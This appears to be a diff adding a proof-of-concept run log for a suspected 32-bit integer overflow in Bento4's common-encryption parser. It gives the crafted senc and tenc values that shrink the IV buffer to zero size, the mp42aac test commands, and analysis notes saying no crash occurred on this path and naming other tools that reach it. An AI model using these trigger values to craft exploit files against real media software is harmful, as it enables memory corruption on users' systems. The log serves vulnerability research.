@@ -1,0 +1,42 @@
+=== VULN 001 PoC Run Script ===
+Date: Mon Sep  7 06:00:41 AM +08 2026
+
+[*] Generating vuln_001.mp4 ...
+[+] Written 738 bytes to /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4CommonEncryption_cpp/vuln_001.mp4
+[+] senc sample_count = 0x10000000 (268435456)
+[+] tenc default_per_sample_iv_size = 16
+[+] Overflow: 16 * 0x10000000 = 0x100000000 (truncates to 0)
+[+] Expected: m_IvData.SetDataSize(0) -> SetIv() OOB write on NULL buffer
+
+[*] MP4 file size: 738 bytes
+
+[*] Running mp42aac with CENC key (all zeros) ...
+[*] Command: mp42aac --key 00000000000000000000000000000000 vuln_001.mp4 /dev/null
+
+ERROR: unable to create decrypter
+Audio Track:
+  duration: 0 ms
+  sample count: 0
+
+[*] Running mp42aac WITHOUT key (parse-only path) ...
+ERROR: encrypted tracks require a key
+Audio Track:
+  duration: 0 ms
+  sample count: 0
+
+[*] Checking ASAN logs ...
+
+[*] No ASAN/UBSAN crash detected
+
+=== Analysis Notes ===
+The vulnerability is in AP4_CencSampleInfoTable::AP4_CencSampleInfoTable():
+  line 3007: m_IvData.SetDataSize(m_IvSize * sample_count)
+With m_IvSize=16, sample_count=0x10000000:
+  16 * 0x10000000 = 0x100000000 -> truncates to 0 (32-bit overflow)
+  m_IvData.SetDataSize(0) -> m_IvData.m_Buffer stays NULL
+  SetIv(0, data) -> memcpy(NULL, data, 16) -> OOB WRITE
+
+Note: mp42aac uses AP4_SampleDecrypter::Create(pdesc,key,size) which returns NULL
+for CENC scheme (only OMA/IAEC are handled). The crash requires the traf-aware
+version: AP4_SampleDecrypter::Create(pdesc,traf,...) used by other Bento4 tools.
+[DONE]
